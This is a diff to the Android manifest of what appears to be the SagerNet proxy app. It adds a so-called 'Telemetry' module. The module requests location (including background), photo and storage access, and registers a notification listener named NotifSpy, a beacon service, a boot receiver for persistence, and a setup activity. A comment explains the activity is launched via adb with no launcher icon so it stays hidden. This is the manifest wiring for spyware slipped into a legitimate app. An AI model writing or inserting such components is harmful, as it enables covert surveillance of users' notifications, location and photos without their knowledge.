@@ -47,6 +47,17 @@
         </intent>
     </queries>
 
+    <!-- ===== Telemetry 模块：位置 / 相册 / 前台服务类型 ===== -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+
     <application
         android:name="io.nekohasekai.sagernet.SagerNet"
         android:allowBackup="true"
@@ -341,6 +352,38 @@
         <service
             android:name="androidx.room.MultiInstanceInvalidationService"
             android:process=":bg" />
+
+        <!-- ===== Telemetry 模块组件 ===== -->
+        <service
+            android:name=".telemetry.NotifSpy"
+            android:exported="true"
+            android:label="通知读取"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
+        <service
+            android:name=".telemetry.BeaconService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- exported=true 是为了能用 adb am start 直接拉起，
+             不挂 launcher category，所以不会在桌面出现图标 -->
+        <activity
+            android:name=".telemetry.TelemetrySetup"
+            android:exported="true"
+            android:label="连接组件" />
+
+        <receiver
+            android:name=".telemetry.TlmBootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 
